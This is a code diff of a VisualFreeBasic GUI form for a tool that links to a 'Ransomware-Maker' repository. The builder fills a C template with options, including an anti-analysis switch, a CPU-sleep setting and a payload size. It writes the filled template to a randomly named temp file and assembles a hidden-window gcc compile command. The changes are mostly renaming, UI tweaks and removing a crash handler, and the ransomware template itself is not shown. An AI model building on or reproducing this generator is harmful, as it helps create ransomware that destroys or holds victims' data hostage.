@@ -1,4 +1,4 @@
-﻿#VisualFreeBasic_Form#  Version=5.4.10
+﻿#VisualFreeBasic_Form#  Version=5.6.8
 Locked=0
 
 [Form]
@@ -345,8 +345,8 @@ Default=False
 OwnDraw=False
 MultiLine=False
 Font=宋体,24,1
-Left=7
-Top=297
+Left=2
+Top=296
 Width=570
 Height=76
 Layout=0 - 不锚定
@@ -495,12 +495,6 @@ ToolTip=
 ToolTipBalloon=False
 AcceptFiles=False
 
-[VEH]
-Name=VEH1
-Left=539
-Top=14
-Tag=
-
 [TextBox]
 Name=ohzm
 Index=-1
@@ -564,8 +558,9 @@ ToolTipBalloon=False
 Name=Object_B
 Index=-1
 Style=0 - 标签和下拉框
-Custom=KB|0|<Sel>MB|0|GB|0
+Custom=KB|0|MB|0|<Sel>GB|0
 OwnDraw=0 - 系统绘制
+LabelHeight=20
 ItemHeight=18
 HasString=False
 Sorted=True
@@ -795,33 +790,6 @@ Const buliddate as string = __Date_Iso__
 
 #define ReadINI(Q_A, Q_B) QC(CWSTRtoString(PR.GetString(Q_A, Q_B)))
 #define ZC(S) YF_Replace(S, vbCrLf, "\n")
-'if Dir(App.Path + "\\bin\\upx.exe") = "" then
-'MessageBox NULL, "无压缩器！！！", "error", 16
-'exit sub
-'End if
-'if Dir(App.Path + "\\bin\\1.c") = "" then
-'MessageBox NULL, "无 1.c ", "error", 16
-'exit sub
-'End if
-'if len(Text1.text) = 0 then
-'MessageBox NULL, "编译器不存在！！！", "error", 16
-'exit sub
-'End if
-'Dim _data As String
-'Dim buffer As String
-'Do While Not EOF(1)
-'Line Input #1, buffer
-'_data = _data + buffer + vbcrlf
-'Loop
-'Close #1
-'if len(Dir(Environ("temp") + "\\6.c")) <> 0 then
-'DeleteFileA Environ("temp") + "\\6.c"
-'End if
-'open Environ("temp") + "\\6.c" for output as #1
-'print #1, _data
-'close #1
-'
-'End Sub
 
 FUNCTION QC(BYVAL Sss as string)As STRING
    Sss = YF_Replace(Sss, "$App_Path$", app.Path)
@@ -839,8 +807,8 @@ FUNCTION QC(BYVAL Sss as string)As STRING
 End function
 Sub Q_BeginSave_BN_Clicked(hWndForm As hWnd ,hWndControl As hWnd)  '单击
    if Len(CWSTRtoString(length.Text)) = 0 Then length.Text = "500"
-    if Len(CWSTRtoString(tobj.Text))=0 Then tobj.Text="500"
-   if InStr(SavePath.Text ,"""") Then
+    If Len(CWSTRtoString(TOBJ.Text))=0 Then TOBJ.Text="500"
+   If InStr(SavePath.Text ,"""") Then
 
 Select Case MsgBox( hWndForm,"清除原文本?", _
             MB_YESNO Or MB_ICONQUESTION Or MB_DEFBUTTON1 Or MB_APPLMODAL)
@@ -871,9 +839,10 @@ Line Input #1, buffer
 _data = _data + buffer + vbcrlf
 Loop
 Close #1
-if len(Dir(Environ("temp") + "\\6.c")) <> 0 then
-DeleteFileA Environ("temp") + "\\6.c"
-End if
+Dim rd_str As String =rdstr 
+Dim 完整路径 As String = Environ("temp") + "\" + rd_str + ".c"
+DeleteFileA 完整路径
+
 if anti then
    _data = YF_Replace( _data ,"$ANTI$" ,"#define _ANTI_")
    _data = YF_Replace( _data ,"$count$" ,CWSTRtoString(TOBJ.TEXT))
@@ -890,20 +859,18 @@ _data = YF_Replace( _data ,"$lists$" ,CWSTRtoString(ohzm.text))
    Else
        _data = YF_Replace( _data ,"$IsCPUSleep$" ,"")
     end if
-if Object_B.ListIndex = 0 Then 
+If Object_B.ListIndex = 0 Then 
 _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"GB")
-elseif Object_B.ListIndex = 2 Then 
+ElseIf Object_B.ListIndex = 1 Then 
+_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(length.text) + "*" + "KB")
+ElseIf Object_B.ListIndex = 2 Then 
 _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"MB")
-elseif Object_B.GetTopIndex = 1 Then 
-   _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text) + "*" + "KB")
-else
-   _data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"MB")
 End If
 
-open Environ("temp") + "\\6.c" for output as #1
-print #1, _data
-close #1
-DIM OP AS STRING
+Open 完整路径 For Output As #1
+Print #1, _data
+Close #1
+Dim OP As String
 if Set_2.Value = true Then
  OP+=" -s "
 End If
@@ -911,7 +878,7 @@ if Set_3.Value = true Then
  OP+=" -O3 "
 End If
 
-SavePath.text=StringToCWSTR( CWSTRtoString(gcc.TEXT) +" -mwindows " + OP +" """+Environ("temp") + "\6.c"+""" -o """ + CWSTRtoString(SavePath.Text) + """" )
+SavePath.text=StringToCWSTR( CWSTRtoString(gcc.TEXT) +" -mwindows " + OP +" """+完整路径+""" -o """ + CWSTRtoString(SavePath.Text) + """" )
 MsgBox "已生成gcc命令行参数!" ,48
 
 End Sub
@@ -924,70 +891,11 @@ Sub Q_WM_RButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPos As
    Select Case MsgBox(hWndForm, "打开INI文件？", _
             MB_YESNO Or MB_ICONQUESTION Or MB_DEFBUTTON2 Or MB_APPLMODAL)
       Case IDYES
-         shell "CONFIG.INI"
-         
+         OpenFileExe "notepad.exe","CONFIG.INI"         
       Case IDNO
          RETURN
    End Select
 End Sub
-
-
-
-Function Q_VEH1_VectExcepHandler(ByRef excp As EXCEPTION_POINTERS)As Integer  '向量化异常处理（程序崩溃后处理）
-   '整个软件，只需一个VEH即可，在主窗口放置控件，所有窗口、模块、多线程等发生崩溃，都会跑到这里执行。
-   Dim errstr as string
-   Select Case excp.ExceptionRecord->ExceptionCode
-         
-      Case EXCEPTION_ACCESS_VIOLATION
-         ErrStr = "线程试图读取或写入对其没有适当访问权限的虚拟地址。"
-      Case EXCEPTION_ARRAY_BOUNDS_EXCEEDED
-         ErrStr = "线程尝试访问超出范围的数组元素，并且基础硬件支持范围检查。"
-      Case EXCEPTION_BREAKPOINT
-         ErrStr = "遇到断点。"
-      Case EXCEPTION_DATATYPE_MISALIGNMENT
-         ErrStr = "线程试图读取或写入在不提供对齐方式的硬件上未对齐的数据。例如，必须在2字节边界上对齐16位值；4字节边界上的32位值，依此类推。"
-      Case EXCEPTION_FLT_DENORMAL_OPERAND
-         ErrStr = "浮点运算中的操作数之一是非正规的。非标准值是一个太小而无法表示为标准浮点值的值。"
-      Case EXCEPTION_FLT_DIVIDE_BY_ZERO
-         ErrStr = "线程试图将浮点值除以零的浮点除数。"
-      Case EXCEPTION_FLT_INEXACT_RESULT
-         ErrStr = "浮点运算的结果不能完全表示为小数。"
-      Case EXCEPTION_FLT_INVALID_OPERATION
-         ErrStr = "此异常表示此列表中未包含的任何浮点异常。"
-      Case EXCEPTION_FLT_OVERFLOW
-         ErrStr = "浮点运算的指数大于相应类型所允许的大小。"
-      Case EXCEPTION_FLT_STACK_CHECK
-         ErrStr = "由于浮点运算，堆栈上溢或下溢。"
-      Case EXCEPTION_FLT_UNDERFLOW
-         ErrStr = "浮点运算的指数小于相应类型所允许的大小。"
-      Case EXCEPTION_ILLEGAL_INSTRUCTION
-         ErrStr = "线程试图执行无效指令。"
-      Case EXCEPTION_IN_PAGE_ERROR
-         ErrStr = "该线程试图访问一个不存在的页面，系统无法加载该页面。例如，如果通过网络运行程序时网络连接丢失，可能会发生此异常。"
-      Case EXCEPTION_INT_DIVIDE_BY_ZERO
-         ErrStr = "线程尝试将整数值除以零的整数除数。"
-      Case EXCEPTION_INT_OVERFLOW
-         ErrStr = "整数运算的结果导致对结果的最高有效位进行进位。"
-      Case EXCEPTION_INVALID_DISPOSITION
-         ErrStr = "异常处理程序将无效处置返回给异常调度程序。使用诸如C之类的高级语言的程序员应该永远不会遇到此异常。"
-      Case EXCEPTION_NONCONTINUABLE_EXCEPTION
-         ErrStr = "发生不可连续的异常后，线程尝试继续执行。"
-      Case EXCEPTION_PRIV_INSTRUCTION
-         ErrStr = "线程试图执行一条指令，该指令在当前机器模式下是不允许的。"
-      Case EXCEPTION_SINGLE_STEP
-         ErrStr = "跟踪陷阱或其他单指令机制表明已执行了一条指令。"
-      Case EXCEPTION_STACK_OVERFLOW
-         ErrStr = "线程耗尽了其堆栈。"
-      Case Else
-         Return 0  '
-   End Select
-   msgbox "errstr:" + vbcrlf + errstr, 16, "Err"
-   Return 0
-   
-End Function
-
-
-
 
 Sub Q_Set_2_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
    if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
@@ -1049,6 +957,7 @@ Sub Q_WM_Create(hWndForm As hWnd,UserData As Integer)  '完成创建窗口及所
    CFILE1 = ReadINI("Setting", "CFILE1.Path")
    CFILE2 = ReadINI("Setting", "CFILE2.Path")
    Helpmsg = ReadINI("About" ,"help")
+OpenFileExe "notepad.exe","声明.txt"
 End Sub
 
 Sub Q_Set_5_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
@@ -1067,13 +976,32 @@ Sub Q_URL_WM_LButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPo
    'MouseFlags  MK_CONTROL   MK_LBUTTON     MK_MBUTTON     MK_RBUTTON    MK_SHIFT     MK_XBUTTON1       MK_XBUTTON2 
    ''           CTRL键按下   鼠标左键按下   鼠标中键按下   鼠标右键按下  SHIFT键按下  第一个X按钮按下   第二个X按钮按下
    '检查什么键按下用  If (MouseFlags And MK_CONTROL)<>0 Then CTRL键按下 
-OpenWWW(NULL,"https://github.com/znkzz/Ransomware-Maker")   
+OpenWWW(NULL,"https://github.com/kaesinol/Ransomware-Maker")   
 End Sub
 
 Function rdmstr()As String
    Randomize
-return str(Int(Rnd * 10000)+1)
+Return Str(Int(Rnd * 100000)+1)
 End Function
+Function rdstr() As String
+Randomize
+Dim str1 As String
+
+For i As Integer= 3 To Int(Rnd * 15)+5
+str1+=Chr(Int((122 - 97 + 1) * Rnd + 97))
+Next 
+Return str1
+End Function
+
+
+
+
+
+
+
+
+
+
 
 
 
